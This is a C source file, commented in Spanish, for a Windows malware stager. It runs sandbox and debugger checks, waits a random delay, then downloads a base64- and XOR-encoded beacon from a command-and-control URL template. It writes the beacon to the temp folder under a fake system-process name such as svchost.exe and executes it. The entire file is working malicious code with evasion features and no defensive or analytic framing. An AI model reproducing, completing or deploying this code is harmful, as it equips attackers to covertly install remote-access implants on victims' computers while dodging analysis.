#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

// === CONFIGURACIÓN ===
#define C2_URL "http://{lhost}/beacon.enc"
#define XOR_KEY 0x33
#define MAX_PAYLOAD_SIZE (1024 * 1024 * 10)  // 10 MB

// === ESTRUCTURAS Y HELLGATE (solo para evasión de análisis) ===
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    DWORD Length;
    DWORD Initialized;
    PVOID SsHandle;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

HMODULE GetNtdllBase() {
    PEB* peb;
#ifdef _WIN64
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
#else
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r" (peb));
#endif

    if (!peb || !peb->Ldr) return NULL;

    LIST_ENTRY* list = peb->Ldr->InMemoryOrderModuleList.Flink;
    LIST_ENTRY* head = list;

    do {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)list - 0x10);
        if (entry->BaseDllName.Length == 20 && entry->BaseDllName.Buffer) {
            if (entry->BaseDllName.Buffer[0] == L'n' &&
                entry->BaseDllName.Buffer[1] == L't' &&
                entry->BaseDllName.Buffer[2] == L'd' &&
                entry->BaseDllName.Buffer[3] == L'l' &&
                entry->BaseDllName.Buffer[4] == L'l' &&
                entry->BaseDllName.Buffer[5] == L'.' &&
                entry->BaseDllName.Buffer[6] == L'd' &&
                entry->BaseDllName.Buffer[7] == L'l' &&
                entry->BaseDllName.Buffer[8] == L'l') {
                return (HMODULE)entry->DllBase;
            }
        }
        list = list->Flink;
    } while (list != head);

    return GetModuleHandleA("ntdll.dll");
}

// === ANTI-ANALYSIS ===
BOOL anti_analysis() {
    if (IsDebuggerPresent()) return TRUE;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\\\DESCRIPTION\\\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            if (strstr(buffer, "VMWARE") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }

    if (GetTickCount() < 60000) return TRUE;

    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;

    return FALSE;
}

// === XOR + BASE64 ===
void xor_data(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

BOOL base64_decode(LPCSTR input, DWORD input_len, BYTE** output, DWORD* output_len) {
    *output_len = 0;
    if (!CryptStringToBinaryA(input, input_len, CRYPT_STRING_BASE64, NULL, output_len, NULL, NULL)) return FALSE;
    *output = (BYTE*)HeapAlloc(GetProcessHeap(), 0, *output_len);
    return *output && CryptStringToBinaryA(input, input_len, CRYPT_STRING_BASE64, *output, output_len, NULL, NULL);
}

// === DESCARGA ===
HGLOBAL download_payload() {
    Sleep(rand() % 15000 + 10000);  // Jitter 10-25 seg

    HINTERNET hInt = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                   INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInt) return NULL;

    HINTERNET hConn = InternetOpenUrlA(hInt, C2_URL, NULL, 0,
                                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConn) { InternetCloseHandle(hInt); return NULL; }

    char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, MAX_PAYLOAD_SIZE);
    if (!buffer) { InternetCloseHandle(hConn); InternetCloseHandle(hInt); return NULL; }

    DWORD total = 0;
    DWORD read;
    BOOL success = FALSE;

    while (InternetReadFile(hConn, buffer + total, 4096, &read) && read > 0) {
        total += read;
        if (total >= MAX_PAYLOAD_SIZE) break;
    }

    success = (total > 0);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInt);

    if (!success || total == 0) {
        HeapFree(GetProcessHeap(), 0, buffer);
        return NULL;
    }

    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, total);
    if (hMem) {
        void* pMem = GlobalLock(hMem);
        if (pMem) {
            memcpy(pMem, buffer, total);
            GlobalUnlock(hMem);
        }
    }
    HeapFree(GetProcessHeap(), 0, buffer);
    return hMem;
}

// === MAIN ===
int main() {
    srand(GetTickCount());

    // Anti-analysis
    if (anti_analysis()) return 1;

    // Descargar
    HGLOBAL hPayload = download_payload();
    if (!hPayload) return 1;

    DWORD raw_len;
    BYTE* raw_payload = NULL;
    char* base64_data = (char*)GlobalLock(hPayload);
    if (!base64_decode(base64_data, GlobalSize(hPayload), &raw_payload, &raw_len)) {
        GlobalUnlock(hPayload);
        GlobalFree(hPayload);
        return 1;
    }
    GlobalUnlock(hPayload);
    GlobalFree(hPayload);

    xor_data(raw_payload, raw_len);

    // Obtener %TEMP%
    char temp_path[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, temp_path)) {
        HeapFree(GetProcessHeap(), 0, raw_payload);
        return 1;
    }

    // Nombre aleatorio más realista
    char target_path[MAX_PATH];
    const char* prefixes[] = { "svchost", "dllhost", "msiexec", "wmiprvse", "spoolsv" };
    sprintf(target_path, "%s%s.exe", temp_path, prefixes[rand() % 5]);

    // Escribir archivo - SIN DELETE_ON_CLOSE
    HANDLE hFile = CreateFileA(target_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, raw_payload);
        return 1;
    }

    DWORD written;
    BOOL success = WriteFile(hFile, raw_payload, raw_len, &written, NULL);
    CloseHandle(hFile);

    // Liberar payload DESPUÉS de escribir
    HeapFree(GetProcessHeap(), 0, raw_payload);


    // Ejecutar
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    BOOL exec_ok = FALSE;
    if (CreateProcessA(target_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Sleep(2000);  // Esperar a que el beacon inicie
        exec_ok = TRUE;
    }

    return exec_ok ? 0 : 1;
}